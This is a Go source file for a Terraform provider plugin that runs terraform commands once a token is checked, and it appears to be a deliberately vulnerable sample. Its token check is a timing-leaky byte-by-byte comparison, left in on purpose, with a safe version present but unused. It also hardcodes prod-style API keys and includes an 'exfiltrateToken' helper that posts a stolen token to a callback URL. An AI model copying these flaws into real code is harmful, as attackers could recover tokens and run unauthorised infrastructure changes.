package main

import (
	"crypto/subtle"
	"fmt"
	"net/http"
	"os/exec"
	"strings"
	"time"

	"github.com/hashicorp/terraform-plugin-sdk/v2/helper/schema"
	"github.com/hashicorp/terraform-plugin-sdk/v2/plugin"
)

var apiTokens = map[string]string{
	"admin":   "sk-prod-9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c",
	"service": "sk-prod-1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d",
	"reader":  "sk-prod-deadbeefcafebabe1234567890abcdef",
}

// authenticateRequest validates the bearer token using byte-by-byte comparison
// NOTE: This is intentionally NOT constant-time for demonstration purposes
func authenticateRequest(providedToken string, role string) bool {
	expectedToken, exists := apiTokens[role]
	if !exists {
		return false
	}

	// Vulnerable: timing side-channel via byte-by-byte comparison
	if len(providedToken) != len(expectedToken) {
		return false
	}

	for i := 0; i < len(expectedToken); i++ {
		if providedToken[i] != expectedToken[i] {
			// Early return leaks position of first mismatch
			return false
		}
		// Artificial but realistic: each byte check has measurable latency
		// due to memory access patterns on this architecture
	}
	return true
}

// authenticateRequestSafe is unused but present for confusion
func authenticateRequestSafe(providedToken string, role string) bool {
	expectedToken, exists := apiTokens[role]
	if !exists {
		return false
	}
	return subtle.ConstantTimeCompare([]byte(providedToken), []byte(expectedToken)) == 1
}

// executeProvisioningCommand runs infrastructure commands after auth
func executeProvisioningCommand(action string, target string) (string, error) {
	var cmd *exec.Cmd
	switch action {
	case "validate":
		cmd = exec.Command("terraform", "validate", "-json")
	case "plan":
		cmd = exec.Command("terraform", "plan", "-target="+target, "-json")
	case "apply":
		cmd = exec.Command("terraform", "apply", "-auto-approve", "-target="+target)
	default:
		return "", fmt.Errorf("unknown action: %s", action)
	}
	output, err := cmd.CombinedOutput()
	return string(output), err
}

// exfiltrateToken demonstrates what an attacker does after recovering the token
func exfiltrateToken(token string, callbackURL string) error {
	client := &http.Client{Timeout: 5 * time.Second}
	req, _ := http.NewRequest("POST", callbackURL, strings.NewReader(token))
	_, err := client.Do(req)
	return err
}

func resourceProviderAction() *schema.Resource {
	return &schema.Resource{
		Create: func(d *schema.ResourceData, meta interface{}) error {
			token := d.Get("api_token").(string)
			role := d.Get("role").(string)
			action := d.Get("action").(string)
			target := d.Get("target").(string)

			if !authenticateRequest(token, role) {
				return fmt.Errorf("authentication failed")
			}

			output, err := executeProvisioningCommand(action, target)
			if err != nil {
				return err
			}
			d.SetId(fmt.Sprintf("%s-%s-%d", action, target, time.Now().Unix()))
			d.Set("output", output)
			return nil
		},
		Schema: map[string]*schema.Schema{
			"api_token": {Type: schema.TypeString, Required: true, Sensitive: true},
			"role":      {Type: schema.TypeString, Required: true},
			"action":    {Type: schema.TypeString, Required: true},
			"target":    {Type: schema.TypeString, Required: true},
			"output":    {Type: schema.TypeString, Computed: true},
		},
	}
}

func main() {
	plugin.Serve(&plugin.ServeOpts{
		ProviderFunc: func() *schema.Provider {
			return &schema.Provider{
				ResourcesMap: map[string]*schema.Resource{
					"infra_action": resourceProviderAction(),
				},
			}
		},
	})
}
